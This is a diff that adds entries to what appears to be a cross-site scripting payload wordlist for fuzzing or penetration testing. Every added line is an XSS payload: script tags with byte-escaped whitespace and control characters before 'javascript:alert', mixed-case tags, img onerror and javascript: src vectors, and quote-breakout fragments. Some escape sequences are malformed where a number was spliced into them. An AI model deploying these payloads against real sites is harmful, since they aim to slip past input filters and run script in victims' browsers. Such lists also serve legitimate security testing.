@@ -1,3 +1,53 @@
+"`'><script>\x09javascript:alert(507)</script>
+"`'><script>\xE2\x80\x89javascript:alert(508)</script>
+"`'><script>\xE2\x80\x85javascript:alert(509)</script>
+"`'><script>\xE2\x80\x88javascript:alert(510)</script>
+"`'><script>\x00javascript:alert(511)</script>
+"`'><script>\xE2\x80\xA8javascript:alert(512)</script>
+"`'><script>\xE2\x80\x8Ajavascript:alert(513)</script>
+"`'><script>\xE514\x9A\x80javascript:alert(514)</script>
+"`'><script>\x0Cjavascript:alert(515)</script>
+"`'><script>\x2Bjavascript:alert(516)</script>
+"`'><script>\xF0\x90\x96\x9Ajavascript:alert(517)</script>
+"`'><script>-javascript:alert(518)</script>
+"`'><script>\x0Ajavascript:alert(519)</script>
+"`'><script>\xE2\x80\xAFjavascript:alert(520)</script>
+"`'><script>\x7Ejavascript:alert(521)</script>
+"`'><script>\xE2\x80\x87javascript:alert(522)</script>
+"`'><script>\xE2\x8523\x9Fjavascript:alert(523)</script>
+"`'><script>\xE2\x80\xA9javascript:alert(524)</script>
+"`'><script>\xC2\x85javascript:alert(525)</script>
+"`'><script>\xEF\xBF\xAEjavascript:alert(526)</script>
+"`'><script>\xE2\x80\x83javascript:alert(527)</script>
+"`'><script>\xE2\x80\x8Bjavascript:alert(528)</script>
+"`'><script>\xEF\xBF\xBEjavascript:alert(529)</script>
+"`'><script>\xE2\x80\x80javascript:alert(530)</script>
+"`'><script>\x2531javascript:alert(531)</script>
+"`'><script>\xE2\x80\x82javascript:alert(532)</script>
+"`'><script>\xE2\x80\x86javascript:alert(533)</script>
+"`'><script>\xE534\xA0\x8Ejavascript:alert(534)</script>
+"`'><script>\x0Bjavascript:alert(535)</script>
+"`'><script>\x20javascript:alert(536)</script>
+"`'><script>\xC2\xA0javascript:alert(537)</script>
+<script>alert(123);</script>
+<ScRipT>alert("XSS");</ScRipT>
+<script>alert(123)</script>
+<script>alert("hellox worldss");</script>
+<script>alert(“XSS”)</script> 
+<script>alert(“XSS”);</script>
+<script>alert(‘XSS’)</script>
+“><script>alert(“XSS”)</script>
+<script>alert(/XSS”)</script>
+<script>alert(/XSS/)</script>
+</script><script>alert(1)</script>
+‘; alert(1);
+‘)alert(1);//
+<ScRiPt>alert(1)</sCriPt>
+<IMG SRC=jAVasCrIPt:alert(‘XSS’)>
+<IMG SRC=”javascript:alert(‘XSS’);”>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=javascript:alert(‘XSS’)>      
+<img src=xss onerror=alert(1)>
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
